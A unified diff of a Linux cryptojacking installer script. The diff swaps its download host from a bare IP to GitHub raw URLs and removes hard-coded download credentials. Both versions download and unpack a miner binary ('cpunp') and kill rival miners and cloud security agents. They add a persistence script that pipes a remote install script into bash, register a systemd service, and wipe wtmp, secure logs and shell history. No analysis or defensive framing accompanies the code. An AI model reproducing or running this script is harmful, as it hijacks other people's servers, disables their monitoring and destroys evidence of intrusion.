@@ -1,10 +1,10 @@
 #!/bin/sh
 
-checkurl="http://185.239.225.13/static/install.sh"
-binurl="http://185.239.225.13/static/cpunp.tar.gz"
-cpuurl="http://185.239.225.13/static/cpunp"
-dofurl="http://185.239.225.13/static/dof"
-cronurl="http://185.239.225.13/static/crons"
+checkurl="https://raw.githubusercontent.com/cpunpgz/gz/main/install.sh"
+binurl="https://raw.githubusercontent.com/cpunpgz/gz/main/cpunp.tar.gz"
+cpuurl="https://raw.githubusercontent.com/cpunpgz/gz/main/cpunp"
+dofurl="https://raw.githubusercontent.com/cpunpgz/gz/main/dof"
+cronurl="https://raw.githubusercontent.com/cpunpgz/gz/main/bin/crons"
 ulimit -n 65535 2>/dev/null
 rm -f /tmp 2>/dev/null
 mkdir -p /tmp 2>/dev/null
@@ -47,7 +47,6 @@ elif ps aux | grep -i '[y]unjing'; then
   /usr/local/qcloud/monitor/barad/admin/uninstall.sh
 fi
 
-
 netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
 netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
 netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
@@ -63,23 +62,23 @@ netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -
 netstat -anp | grep :14444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
 netstat -anp | grep :14433 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
 netstat -anp | grep :13531 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
-cat /tmp/.X11-unix/01|xargs -I % kill -9 %
-cat /tmp/.X11-unix/11|xargs -I % kill -9 %
-cat /tmp/.X11-unix/22|xargs -I % kill -9 %
-cat /tmp/.pg_stat.0|xargs -I % kill -9 %
-cat /tmp/.pg_stat.1|xargs -I % kill -9 %
-cat $HOME/data/./oka.pid|xargs -I % kill -9 %
+cat /tmp/.X11-unix/01 | xargs -I % kill -9 %
+cat /tmp/.X11-unix/11 | xargs -I % kill -9 %
+cat /tmp/.X11-unix/22 | xargs -I % kill -9 %
+cat /tmp/.pg_stat.0 | xargs -I % kill -9 %
+cat /tmp/.pg_stat.1 | xargs -I % kill -9 %
+cat $HOME/data/./oka.pid | xargs -I % kill -9 %
 pkill -f zsvc
 pkill -f pdefenderd
 pkill -f updatecheckerd
-ps aux| grep "./oka"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
-ps aux| grep "postgres: autovacum"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
-ps ax -o command,pid -www| awk 'length($1) == 8'|grep -v bin|grep -v "\["|grep -v "("|grep -v "php-fpm"|grep -v proxymap|grep -v postgres|grep -v postgrey|grep -v kinsing| awk '{print $2}'|xargs -I % kill -9 %
-ps ax -o command,pid -www| awk 'length($1) == 16'|grep -v bin|grep -v "\["|grep -v "("|grep -v "php-fpm"|grep -v proxymap|grep -v postgres|grep -v postgrey| awk '{print $2}'|xargs -I % kill -9 %
-ps ax| awk 'length($5) == 8'|grep -v bin|grep -v "\["|grep -v "("|grep -v "php-fpm"|grep -v proxymap|grep -v postgres|grep -v postgrey| awk '{print $1}'|xargs -I % kill -9 %
+ps aux | grep "./oka" | grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep "postgres: autovacum" | grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
+ps ax -o command,pid -www | awk 'length($1) == 8' | grep -v bin | grep -v "\[" | grep -v "(" | grep -v "php-fpm" | grep -v proxymap | grep -v postgres | grep -v postgrey | grep -v kinsing | awk '{print $2}' | xargs -I % kill -9 %
+ps ax -o command,pid -www | awk 'length($1) == 16' | grep -v bin | grep -v "\[" | grep -v "(" | grep -v "php-fpm" | grep -v proxymap | grep -v postgres | grep -v postgrey | awk '{print $2}' | xargs -I % kill -9 %
+ps ax | awk 'length($5) == 8' | grep -v bin | grep -v "\[" | grep -v "(" | grep -v "php-fpm" | grep -v proxymap | grep -v postgres | grep -v postgrey | awk '{print $1}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep '/tmp/sscks' | awk '{print $2}' | xargs -I % kill -9 %
-ps aux| grep "sleep 60"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
-ps aux| grep "./crun"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep "sleep 60" | grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
+ps aux | grep "./crun" | grep -v grep | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -vw kdevtmpfsi | grep -v grep | awk '{if($3>80.0) print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
@@ -150,7 +149,7 @@ ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9
 ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
-ps aux | grep -v grep | grep -v root | grep -v dblaunch | grep -v dblaunchs | grep -v dblaunched | grep -v apache2 | grep -v atd | grep -v kdevtmpfsi|grep -v postgresq1 | awk '$3>80.0{print $2}' | xargs -I % kill -9 %
+ps aux | grep -v grep | grep -v root | grep -v dblaunch | grep -v dblaunchs | grep -v dblaunched | grep -v apache2 | grep -v atd | grep -v kdevtmpfsi | grep -v postgresq1 | awk '$3>80.0{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
 ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
 ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
@@ -555,32 +554,31 @@ pacman -S tar bash 2>/dev/null
 yum install -y tar bash 2>/dev/null
 dnf install -y tar bash 2>/dev/null
 
-if ! curl -u admin:kNo717eg -L --progress-bar "$binurl" -o /tmp/cpunp.tar.gz; then
+if ! curl  -L --progress-bar "$binurl" -o /tmp/cpunp.tar.gz; then
   echo "ERROR: Can't download"
 else
   if ! tar zvxf /tmp/cpunp.tar.gz -C /usr/bin; then
-      echo "ERROR: Can't unpack"
-    if ! curl -u admin:kNo717eg -L --progress-bar "$cpuurl" -o /usr/bin/cpunp; then
+    echo "ERROR: Can't unpack"
+    if ! curl  -L --progress-bar "$cpuurl" -o /usr/bin/cpunp; then
       echo "ERROR: Can't download"
     fi
-    if ! curl -u admin:kNo717eg -L --progress-bar "$dofurl" -o /usr/bin/dof; then
+    if ! curl -L --progress-bar "$dofurl" -o /usr/bin/dof; then
       echo "ERROR: Can't download"
     fi
   else
-      echo "unpack"
+    echo "unpack"
   fi
 fi
 
-
-if ! curl -u admin:kNo717eg -L --progress-bar "$cronurl" -o /usr/bin/crons; then
-    echo "ERROR: Can't crons"
+if ! curl -L --progress-bar "$cronurl" -o /usr/bin/crons; then
+  echo "ERROR: Can't crons"
 fi
 
 rm -rf /tmp/cpunp.tar.gz 2>/dev/null
 
-PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+PASS=$(hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g')
 if [ "$PASS" == "localhost" ]; then
-  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+  PASS=$(ip route get 1 | awk '{print $NF;exit}')
 fi
 if [ -z $PASS ]; then
   PASS=na
@@ -608,7 +606,7 @@ cat >/usr/bin/check <<EOL
 #!/bin/sh
 sleep 30
 if ! pidof cpunp >/dev/null; then
-  curl -u admin:kNo717eg -s -L $checkurl | bash
+  curl  -s -L $checkurl | bash
 fi
 EOL
 # chmod
@@ -660,13 +658,13 @@ systemctl enable systemd-check 2>/dev/null
 sleep 5
 
 if ! pidof cpunp >/dev/null; then
-  nohup nice /usr/bin/cpunp --config=/usr/bin/dof > /var/log/boot.log 2>&1 &
+  nohup nice /usr/bin/cpunp --config=/usr/bin/dof >/var/log/boot.log 2>&1 &
 #  nice /usr/bin/cpunp -c /usr/bin/dof -B
 else
   echo "create miner success"
 fi
 if ! pidof crons >/dev/null; then
-  nohup /usr/bin/crons > /var/log/boot.log 2>&1 &
+  nohup /usr/bin/crons >/var/log/boot.log 2>&1 &
 #  nice /usr/bin/cpunp -c /usr/bin/dof -B
 else
   echo "create miner success"
@@ -676,8 +674,8 @@ history -c 2>/dev/null
 rm -rf /tmp 2>/dev/null
 mkdir -p /tmp 2>/dev/null
 #echo > /var/spool/mail/root 2>/dev/null
-echo > /var/log/wtmp 2>/dev/null
-echo > /var/log/secure 2>/dev/null
-echo > /root/.bash_history 2>/dev/null
-echo > ~/.bash_history 2>/dev/null
+echo >/var/log/wtmp 2>/dev/null
+echo >/var/log/secure 2>/dev/null
+echo >/root/.bash_history 2>/dev/null
+echo >~/.bash_history 2>/dev/null
 history -c 2>/dev/null
